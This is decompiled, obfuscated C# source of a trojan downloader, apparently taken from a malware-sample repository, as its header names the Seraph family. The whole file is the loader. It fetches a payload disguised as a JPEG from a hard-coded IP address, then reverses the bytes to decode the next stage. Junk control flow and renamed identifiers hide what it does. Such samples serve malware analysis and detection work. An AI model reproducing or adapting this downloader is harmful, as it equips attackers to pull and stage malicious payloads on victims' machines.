// Decompiled with JetBrains decompiler
// Type: 
// Assembly: Scan301103506730, Version=2.0.0.111, Culture=neutral, PublicKeyToken=null
// MVID: E6ED378F-56DB-4CE6-3A15-568161AA2E0A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan-Downloader.MSIL.Seraph.alsy-dad636121376d5be76f70c74bc3a32b4d2022e07d2ada00d53dc6ee2f63759cd.exe

using System.Collections.Concurrent;
using System.IO;
using System.Net;

internal static class \u0002
{
  private static byte[] \u0002(byte[] _param0)
  {
    ConcurrentQueue<byte> concurrentQueue1 = new ConcurrentQueue<byte>();
    if (true)
      goto label_3;
label_1:
    object obj1 = new object();
    if (true)
      goto label_4;
label_2:
    int length = _param0.Length;
    int index;
    if (true)
      index = length;
    ConcurrentQueue<byte> concurrentQueue2;
    object obj2;
    while (index-- > 0)
    {
      lock (obj2)
        concurrentQueue2.Enqueue(_param0[index]);
    }
    return concurrentQueue2.ToArray();
label_4:
    obj2 = obj1;
    goto label_2;
label_3:
    concurrentQueue2 = concurrentQueue1;
    goto label_1;
  }

  internal static byte[] \u0002()
  {
    try
    {
      if (true)
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
    }
    catch
    {
    }
    byte[] numArray1 = \u0002.\u0002(\u0002.\u0002("http://18.193.102.232/z90/loader/uploads/Scan301103506730_Efzcwlym.jpg"));
    if (true)
      goto label_5;
label_4:
    byte[] numArray2;
    return numArray2;
label_5:
    numArray2 = numArray1;
    goto label_4;
  }

  private static byte[] \u0002(string _param0)
  {
    MemoryStream memoryStream = new MemoryStream();
    MemoryStream destination;
    if (true)
      destination = memoryStream;
    try
    {
      WebRequest webRequest1 = WebRequest.Create(_param0);
      if (true)
        goto label_4;
label_3:
      WebRequest webRequest2;
      Stream responseStream = webRequest2.GetResponse().GetResponseStream();
      Stream stream;
      if (true)
        stream = responseStream;
      try
      {
        stream.CopyTo((Stream) destination);
        return destination.ToArray();
      }
      finally
      {
        stream?.Dispose();
      }
label_4:
      webRequest2 = webRequest1;
      goto label_3;
    }
    finally
    {
      destination.Dispose();
    }
  }
}
